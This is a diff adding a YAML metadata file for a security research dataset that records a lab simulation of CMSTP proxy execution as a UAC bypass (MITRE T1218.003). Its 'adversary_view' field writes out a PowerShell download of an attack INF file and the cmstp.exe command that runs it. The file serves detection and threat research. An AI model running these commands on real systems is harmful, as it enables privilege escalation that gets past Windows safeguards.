@@ -1,0 +1,32 @@
+title: CMSTP Proxy Execution
+id: SDWIN-201022015432
+author: Roberto Rodriguez @Cyb3rWard0g
+creation_date: 2020/10/22
+modification_date: 2020/10/22
+platform: Windows
+tags:
+  - art.748cb4f6-2fb3-4e97-b7ad-b22635a09ab0
+description: This dataset represents threat actors leveraging CMSTP to execute an Inf file to proxy execute other malicious commands (i.e. cmd.exe). (Embedding commands in the RunPreSetupCommandsSection of the INF file).
+attack_mappings:
+  - technique: T1218
+    sub-technique: "003"
+    tactics:
+      - TA0005
+notebooks:
+files:
+- type: Host
+  link: https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/defense_evasion/host/psh_cmstp_execution_bypassuac.zip
+simulation:
+  environment: Lab VM
+  tools:
+    - type: Manual
+      name: powershell
+      module: powershell
+      script: https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass
+  permissions_required:
+    - User
+  adversary_view: |-
+    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf" -OutFile C:\ProgramData\T1218.003_uacbypass.inf
+    cmstp.exe /s C:\ProgramData\T1218.003_uacbypass.inf /au
+references:
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.003/T1218.003.md#atomic-test-2---cmstp-executing-uac-bypass
